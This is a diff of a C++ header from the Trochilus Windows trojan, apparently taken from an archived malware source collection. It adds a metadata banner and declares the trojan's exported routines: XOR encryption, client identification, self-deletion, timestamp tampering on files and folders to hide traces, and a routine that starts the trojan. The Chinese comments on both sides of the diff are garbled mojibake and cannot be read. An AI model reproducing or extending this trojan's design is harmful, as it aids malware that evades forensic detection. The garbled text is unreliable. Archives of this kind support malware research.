@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
 #include "../../../common/CommNames.h"
 
@@ -7,26 +18,26 @@
 #	define SHELL_API extern "C" __declspec(dllimport)
 #endif
 
-//»ñÈ¡µ±Ç°Â·¾¶£¬·µ»ØÖµÒÔ\½áÎ²
+//ï¿½ï¿½È¡ï¿½ï¿½Ç°Â·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½\ï¿½ï¿½Î²
 SHELL_API LPCTSTR GetLocalPath();
 
-//Òì»ò¼Ó½âÃÜ
+//ï¿½ï¿½ï¿½Ó½ï¿½ï¿½ï¿½
 SHELL_API BOOL XFC(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);
 
-//»ñÈ¡¿Í»§¶ËID
+//ï¿½ï¿½È¡ï¿½Í»ï¿½ï¿½ï¿½ID
 SHELL_API BOOL GetClientID(GUID* pGuid);
 
-//ÍË³ö³ÌÐò
+//ï¿½Ë³ï¿½ï¿½ï¿½ï¿½ï¿½
 SHELL_API void Exit();
 
-//¿Í»§¶Ë×Ô»Ù
+//ï¿½Í»ï¿½ï¿½ï¿½ï¿½Ô»ï¿½
 SHELL_API void SD();
 
-//¸ù¾ÝServantShellµÄÊ±¼äµ÷Õû ÎÄ¼þÊ±¼ä
+//ï¿½ï¿½ï¿½ï¿½ServantShellï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½Ä¼ï¿½Ê±ï¿½ï¿½
 SHELL_API BOOL AdjustTimes(LPCTSTR filepath);
 
-//µ÷ÕûËùÔÚÄ¿Â¼µÄÊ±¼ä
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ê±ï¿½ï¿½
 SHELL_API void CheckDT();
 
-//¿ªÊ¼ÔËÐÐÄ¾Âí
+//ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½Ä¾ï¿½ï¿½
 SHELL_API void Init(BOOL isIns = TRUE);
